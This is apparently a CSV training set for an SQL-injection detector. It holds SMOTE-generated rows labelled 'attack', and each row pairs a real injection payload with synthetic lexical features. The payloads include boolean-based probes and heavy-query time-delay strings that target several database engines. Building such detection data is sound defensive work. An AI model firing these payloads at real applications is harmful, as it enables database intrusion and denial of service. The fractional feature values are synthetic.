id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000393,attack,boolean,"1""  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000600,0.46308393786294844,108.02733652598477,33.805467305196956,3.7157518850993165,31.0,15.0,45.22186922078781,16.805467305196952,0.28706356454608967,0.13890172478036597,0.4184832626032615,0.1555514480702829,2.194532694803047,0.8054673051969531,2.0,1.0,0.0,1.0,0.0,8.805467305196952,0.0,-1.1102230246251565e-16,1.0,4.0,1.0,0.8054673051969532,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999998
SMOTE_000394,attack,boolean,"-6160'   )    )     )   or make_set  (  1924  =  4415,4415  )   and    (    (     (  'hayr'  =  'hayr",nearest_attack_euclidean,R000324,0.5002994555973718,98.85166383766513,25.710998302599076,3.2483784586860747,18.281331070132104,16.0,48.0,16.570332767533024,0.18454838710087046,0.16196095076292882,0.48588285228878647,0.16760780984741425,4.0,0.0,1.0,-1.3877787807814457e-17,0.0,2.0,0.0,8.0,0.0,0.5703327675330256,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000395,attack,boolean,"1""  )   and make_set  (  4553  =  8132,8132  )   and   (  ""pfci"" like ""pfci",nearest_attack_euclidean,R000730,0.3276078344852987,74.85501716358141,25.420068654325586,3.8377403547079236,24.420068654325586,13.0,26.289965672837205,11.144982836418603,0.3261494990963755,0.17367293276998952,0.3512643205783197,0.1489132475553153,0.0,4.0,0.0,-1.3877787807814457e-17,0.0,1.1449828364186032,0.0,4.0,0.0,1.0,1.0,1.1449828364186034,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000396,attack,boolean,-6712'   )    )    as kqff where 9146  =  9146 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,nearest_attack_euclidean,R000232,1.0621276355407614,154.66276221730888,37.577517481153926,4.293633508917906,60.465104886923555,26.0,47.62013984923141,20.577517481153926,0.3909269066240208,0.1685003055538998,0.3073701030648984,0.13320268475718094,4.577517481153926,0.42248251884607446,3.0,-1.3877787807814457e-17,0.0,2.0,0.0,5.577517481153926,0.0,-1.1102230246251565e-16,2.220446049250313e-16,9.0,1.0,0.4224825188460746,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,1.0,1.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000397,attack,boolean,1'   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   'trzi'  =  'trzi,nearest_attack_euclidean,R000591,0.06213753920488113,137.0,26.728200529288404,3.304071684138416,42.0,13.0,66.0,16.0,0.30656934306569344,0.0948905109489051,0.48175182481751827,0.11678832116788321,4.0,0.0,0.0,-1.3877787807814457e-17,0.0,2.0,0.0,10.0,0.0,-1.1102230246251565e-16,2.220446049250313e-16,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000398,attack,boolean,-6341' or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and 'ugys'  =  'ugys,nearest_attack_euclidean,R000725,0.911314142024152,141.7439371750321,37.41868760832263,4.342685368873834,60.67475043329052,20.32524956670948,41.32524956670948,19.418687608322628,0.42869848427757584,0.14296203865894075,0.2911703223832229,0.13716915468026056,6.83737521664526,0.0,1.0,-1.3877787807814457e-17,0.0,2.0,0.0,4.58131239167737,0.0,-1.1102230246251565e-16,2.220446049250313e-16,7.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,1.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000399,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000041,0.5935448897283442,89.64282287557384,23.342870849770467,3.2722914332646087,19.68574169954093,13.0,42.62851660091814,14.328564575114767,0.22028909936125998,0.14511770559842865,0.4747796365906455,0.1598135584496659,4.0,0.0,0.0,-1.3877787807814457e-17,0.0,2.0,0.0,6.657129150229534,0.0,0.671435424885233,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000400,attack,boolean,"1   )    )    and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000263,0.07701646013017889,140.5941254400815,30.88403584002329,4.073980317133665,71.59412544008151,8.942017920011645,43.115964159976706,16.942017920011647,0.5091560630552358,0.0635904201207213,0.30675365473871125,0.12049986208533164,0.0,0.0,2.0,-1.3877787807814457e-17,1.0,1.0,0.0,6.057982079988355,0.0,-1.1102230246251565e-16,2.9420179200116454,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000401,attack,boolean,"1%""   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000749,0.38892977919838984,127.7042466547894,31.0,4.051379379596496,65.0,8.0,38.175068561248054,16.529178093541343,0.509371088859806,0.06269182632120689,0.29851390474496,0.1294231800740271,0.0,1.0,2.0,-1.3877787807814457e-17,1.0,1.0,0.0,5.529178093541343,1.0,-1.1102230246251565e-16,2.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000402,attack,boolean,1'||  (  select 'feyg' from dual where 7734  =  7734 and 3843  =  6724#,nearest_attack_euclidean,R000359,1.551788326859028,69.451631612609,29.225815806304503,4.13064279818993,25.225815806304503,15.967754408406005,19.516122795797,8.741938602101502,0.36300985922422224,0.2292595505054113,0.28192063225612474,0.12580995801424172,2.4838772042030026,0.0,0.0,-1.3877787807814457e-17,0.0,1.7419386021015013,0.0,1.5161227957969974,0.0,0.2580613978984987,0.2580613978984987,3.225815806304504,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.7419386021015013,0.7419386021015013,0.0,0.7419386021015013,0.7419386021015013,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.225815806304504
SMOTE_000403,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (     (  'knbx' like 'knbx",nearest_attack_euclidean,R000677,0.23517811653291085,157.88766062132504,35.0,3.9347824243739016,63.0,10.0,59.23971718443754,25.64794343688751,0.3993698218267112,0.06339203521058909,0.37479761197673894,0.16244053098596073,3.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,12.647943436887505,0.0,2.0,1.0,6.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000404,attack,boolean,"1  )   where 5465  =  5465 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000240,0.16489617653749367,149.71712317486015,32.132086398066164,4.106386029641676,76.792518388397,16.132086398066164,41.528345592264664,15.264172796132332,0.5129591808038183,0.107775508482291,0.2773540833257472,0.10191122738814348,0.0,0.0,2.0,-1.3877787807814457e-17,1.0,2.0,0.0,5.0,0.0,-1.1102230246251565e-16,2.1320863980661655,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000405,attack,boolean,"-4889""   )    )    as vvuo where 8060  =  8060 or   (  8459  =  8459  )  *4906--",nearest_attack_euclidean,R000207,0.43035670237625784,75.95228671501624,21.4603048953355,3.470587544226805,11.380914686006498,24.0,29.841219581341996,10.73015244766775,0.14771027838179013,0.318681753623002,0.39169699838977695,0.14191096960543104,0.0,1.0,3.0,-1.3877787807814457e-17,1.0,2.0,0.0,3.7301524476677494,0.0,-1.1102230246251565e-16,2.220446049250313e-16,6.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000406,attack,boolean,"1%'   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000415,0.7044397732519322,148.59462880577536,30.0,3.8741994506513935,68.0,8.0,51.50968183352174,21.084946972253626,0.45863945281204643,0.05395758268377017,0.3455093499092507,0.1418936145949327,4.0,0.0,0.0,-1.3877787807814457e-17,1.0,2.0,0.0,7.084946972253624,1.9999999999999998,-1.1102230246251565e-16,2.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000407,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (     (  ""mofa"" like ""mofa",nearest_attack_euclidean,R000504,0.5633172192464955,154.9183686720246,34.0,3.923764528812754,63.0,10.0,56.76530722668718,25.153061445337435,0.40726954280669125,0.06464595917566529,0.36572756196268774,0.16235693605495566,0.0,3.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,12.153061445337435,0.0,2.0,1.0,6.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000408,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""nxvp""  =  ""nxvp",nearest_attack_euclidean,R000302,0.1855832178776311,128.0997165193975,32.65982991163851,3.675463191692517,46.0,10.0,53.879773215518014,18.219943303879504,0.3591871295697754,0.07808415860212507,0.4205109891936721,0.14221772263442745,2.0,3.0,0.0,1.0,0.0,1.0,0.0,10.219943303879504,0.0,-1.1102230246251565e-16,1.0,2.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000409,attack,boolean,"1   )    )    as uizx where 2512  =  2512 and make_set  (  1402  =  2908,2908  )  --",nearest_attack_euclidean,R000150,0.008391683540627528,84.0,29.0,3.753530637702143,20.999999999999996,21.0,32.0,10.0,0.25,0.25,0.38095238095238093,0.11904761904761904,0.0,0.0,2.0,-1.3877787807814457e-17,0.0,2.0,0.0,4.0,0.0,1.0,1.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000410,attack,boolean,"1'   )    )    as ngoo where 8641  =  8641 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000125,0.11398439719346651,159.52792507370765,32.0,4.057741298697005,73.5583775221123,18.0,47.11675504422458,20.852792507370765,0.4612938780496768,0.11296847489860634,0.2949851177737629,0.13075252927795394,1.0,0.0,2.0,-1.3877787807814457e-17,1.0,2.0,0.0,5.852792507370763,0.0,5.0,4.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000411,attack,boolean,"""   )    )    or    (    (   ""x""   )    )     =     (    (   ""x",nearest_attack_euclidean,R000008,0.744655958226129,64.32614194942784,8.918098272680801,1.6721215308491866,5.428152868614582,0.9180982726808029,45.18391264650595,12.795978161626488,0.08117566059419534,0.012080240430010575,0.7066800265363815,0.2000640724394125,0.0,4.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,7.795978161626488,0.0,-1.1102230246251565e-16,2.220446049250313e-16,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.20402183837351207,0.897989080813244,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.1020109191867558
SMOTE_000412,attack,boolean,-7041'  )   where 6307  =  6307 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,nearest_attack_euclidean,R000770,0.028414635403856442,146.0,36.012350132212134,4.308537680722745,57.0,26.0,43.0,20.0,0.3904109589041096,0.1780821917808219,0.2945205479452055,0.136986301369863,4.987649867787869,0.012350132212131215,3.0,-1.3877787807814457e-17,0.0,2.0,0.0,5.0,0.0,-1.1102230246251565e-16,2.220446049250313e-16,9.0,1.0,0.012350132212131382,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,1.0,1.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000413,attack,boolean,"1'  )   and elt  (  1407  =  6365,6365  )   and   (  'zckl'  =  'zckl",nearest_attack_euclidean,R000435,0.07578743302490329,69.0,21.729206967852996,3.4904314752708485,17.0,13.0,28.0,11.0,0.2463768115942029,0.18840579710144928,0.4057971014492754,0.15942028985507245,4.0,0.0,0.0,-1.3877787807814457e-17,0.0,2.0,0.0,4.0,0.0,-1.1102230246251565e-16,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000414,attack,boolean,"1'+  (  select thmg where 2546  =  2546 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000709,0.061991079833357415,156.64887213288904,31.96098579254323,4.139636438732561,76.80492896271615,18.0,40.902464481358074,20.941478688814843,0.4902813862857525,0.11493929806204449,0.26110448454038243,0.13367483111182055,0.9804928962716144,0.0,2.0,-1.3877787807814457e-17,1.0,2.0,0.0,4.980492896271614,0.0,5.0,4.0,5.980492896271615,0.9804928962716144,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.9804928962716144,0.0,1.0,1.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.980492896271615
SMOTE_000415,attack,boolean,"-6846%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,nearest_attack_euclidean,R000057,0.6071267623988392,75.71360151032378,18.742720302064754,2.861169550835714,5.0,14.970881208259025,40.0,15.742720302064756,0.06609523673311346,0.19721144099400512,0.5287618938649078,0.20793142840797363,0.0,4.0,1.0,-1.3877787807814457e-17,0.7427203020647559,2.0,0.0,6.0,1.9999999999999998,-1.1102230246251565e-16,2.220446049250313e-16,3.7427203020647557,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000416,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'bzxo' like 'bzxo",nearest_attack_euclidean,R000590,0.054859077138337396,116.45097991049423,29.973471769970928,3.8608527199403357,50.0,10.0,41.371395220407,15.079584690087215,0.4295729196574597,0.08591458393149196,0.3550422393853351,0.12947025702571324,5.0,0.0,0.0,1.0,0.0,0.0,0.0,8.079584690087215,0.0,-1.1102230246251565e-16,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000417,attack,boolean,"-2790""   )    )    as vcvw where 6075  =  6075 or 7078  =  8148--",nearest_attack_euclidean,R000589,0.23380854523440528,65.0,22.157743001088715,3.5783205849476074,13.0,20.0,24.0,8.0,0.2,0.3076923076923077,0.36923076923076925,0.12307692307692308,0.0,1.0,3.0,-1.3877787807814457e-17,0.0,2.0,0.0,2.0,0.0,-1.1102230246251565e-16,2.220446049250313e-16,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000418,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000041,0.273137155996169,85.89037811240291,23.849312722314494,3.4254841809356913,20.999999999999996,13.0,38.19175266777392,13.698625444628986,0.2454395054729022,0.15193874148322517,0.4430680451885732,0.15955370785529946,4.0,0.0,0.0,-1.3877787807814457e-17,0.0,2.0,0.0,5.698625444628986,0.0,1.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000419,attack,boolean,"1""  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""vnso"" like ""vnso",nearest_attack_euclidean,R000227,0.12909985176487773,152.50024909295732,31.214250129577525,4.044793217472568,84.50024909295732,8.0,43.0,17.0,0.5539366082834657,0.05247804608429814,0.2820694977031025,0.11151584792913356,0.0,4.0,0.0,-1.3877787807814457e-17,1.0,1.0,0.0,6.0,0.0,-1.1102230246251565e-16,2.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000420,attack,boolean,-8999'   )    )     )   or 6872  =  6872 and    (    (     (  'jare'  =  'jare,nearest_attack_euclidean,R000751,1.0119163869388714,81.53827628008776,21.09599174507678,3.1131381981205344,14.326853605032905,13.769138140043877,40.0,13.44228453501097,0.1752380723839335,0.16808787411484338,0.49172166797800976,0.16495238552321329,4.0,0.0,1.0,-1.3877787807814457e-17,0.0,2.0,0.0,6.0,0.0,-1.1102230246251565e-16,0.442284535010969,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000421,attack,boolean,1'   )    )    as zbkp where 1720  =  1720 and 4110  =  6748#,nearest_attack_euclidean,R000683,0.1428947613260219,61.0,23.33200366707844,3.570788301582695,14.0,17.0,24.0,6.0,0.22950819672131148,0.2786885245901639,0.39344262295081966,0.09836065573770492,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,2.0,0.0,2.0,0.0,-1.1102230246251565e-16,2.220446049250313e-16,2.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
